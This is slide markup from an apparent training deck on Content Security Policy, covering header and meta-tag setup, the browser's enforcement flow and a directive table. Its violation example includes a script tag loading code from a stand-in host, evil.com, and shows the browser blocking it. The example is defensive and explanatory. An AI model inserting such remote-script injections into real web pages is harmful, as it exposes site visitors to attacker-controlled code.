            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="688777"/>
            <a:ext cx="3361730"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CSP Implementation Methods</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1113949"/>
            <a:ext cx="3345775"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Method 1: HTTP Header (Recommended)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1390293"/>
            <a:ext cx="3774400" cy="442198"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3847"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="1390293"/>
            <a:ext cx="3785592" cy="442198"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3847"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="1475303"/>
            <a:ext cx="3558897"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default-src 'self'; script-src 'self' https://cdn.example.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7461171" y="1113949"/>
            <a:ext cx="2222897"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Method 2: HTML Meta Tag</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7461171" y="1390293"/>
            <a:ext cx="3774400" cy="442198"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3847"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7455575" y="1390293"/>
            <a:ext cx="3785592" cy="442198"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3847"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7568922" y="1475303"/>
            <a:ext cx="3558897"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&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://cdn.example.com"&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1981200"/>
            <a:ext cx="2447449"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CSP Enforcement Flow</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3754636" y="2349698"/>
            <a:ext cx="7121128" cy="3771781"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4740593" y="5045381"/>
            <a:ext cx="1760685" cy="220086"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="1700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Page Load</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4615389" y="5328069"/>
            <a:ext cx="1885890" cy="264103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="1000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Browser requests and loads the webpage.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4049402" y="2878760"/>
            <a:ext cx="1763253" cy="220086"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="1700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSP Header Received</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3926765" y="3161448"/>
            <a:ext cx="1885890" cy="264103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="r">
              <a:lnSpc>
                <a:spcPts val="1000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Server sends Content-Security-Policy header.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8152410" y="2878760"/>
            <a:ext cx="1760685" cy="220086"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Parse Policy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8152410" y="3161448"/>
            <a:ext cx="1885890" cy="264103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Browser parses CSP directives and sources.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8817559" y="5045504"/>
            <a:ext cx="1760685" cy="220086"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Enforce &amp; Log</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8817559" y="5328191"/>
            <a:ext cx="1885890" cy="264103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Check each resource, allow or block and log violations.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="5769851"/>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The browser evaluates every resource request against the CSP policy before allowing it to load, providing real-time protection against unauthorized content.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3379163" y="5935473"/>
            <a:ext cx="2472452"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CSP Violation Example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3566874" y="6218575"/>
            <a:ext cx="765548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CSP Policy:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3572470" y="6939213"/>
            <a:ext cx="7655481" cy="306110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3555682" y="6386392"/>
            <a:ext cx="7666673" cy="306110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3634740" y="6453449"/>
            <a:ext cx="743997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script-src 'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3585686" y="6743534"/>
            <a:ext cx="765548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HTML Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3566874" y="7475826"/>
            <a:ext cx="8792766" cy="306110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3669028" y="7010504"/>
            <a:ext cx="743997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&lt;script src="https://evil.com/malicious.js"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3627834" y="7275653"/>
            <a:ext cx="765548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Browser Console:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3687841" y="7560837"/>
            <a:ext cx="743997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Refused to load the script 'https://evil.com/malicious.js' because it violates the following Content Security Policy directive: "script-src 'self'"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3371970" y="6589537"/>
            <a:ext cx="45719" cy="1957721"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>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02449" y="311825"/>
            <a:ext cx="3616643" cy="354330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="325F7B"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3. CSP Directives Explained</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="688777"/>
            <a:ext cx="3818096"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Fetch Directives (Resource Loading)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1057275"/>
            <a:ext cx="7825502" cy="2645569"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 643"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="000000">
                <a:alpha val="8000"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="1064895"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="1106448"/>
            <a:ext cx="172200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Directive</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="1106448"/>
            <a:ext cx="249924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Controls</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="1106448"/>
            <a:ext cx="2893576"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Example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="1284089"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="1325642"/>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default-src</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="1325642"/>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Fallback for all fetch directives</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="1325642"/>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default-src 'self'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="1503283"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523536" y="1544836"/>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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479852" y="1544836"/>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JavaScript sources</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8213408" y="1544836"/>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'self' cdn.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3410069" y="1722477"/>
            <a:ext cx="7810262" cy="219194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000">
              <a:alpha val="4000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
